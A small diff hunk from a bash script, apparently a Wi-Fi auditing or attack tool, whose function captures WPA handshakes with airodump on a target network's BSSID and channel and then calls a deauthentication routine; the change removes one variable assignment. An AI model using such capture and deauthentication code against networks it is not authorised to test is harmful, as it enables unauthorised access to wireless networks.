@@ -53,7 +53,6 @@ wpa_attacks_handshake(){
 	}
 
 	[[ $Client_MAC != ""  ]] && { directed=1; }
-	clear=""
     execute $"Capturing data on channel: $Host_CHAN"  $AIRODUMP --ignore-negative-one  -w $DUMP_PATH/$Host_MAC --bssid $Host_MAC --channel $Host_CHAN -a $wifi
 
 	[[ $directed == 1 ]] && choose_deauth 2
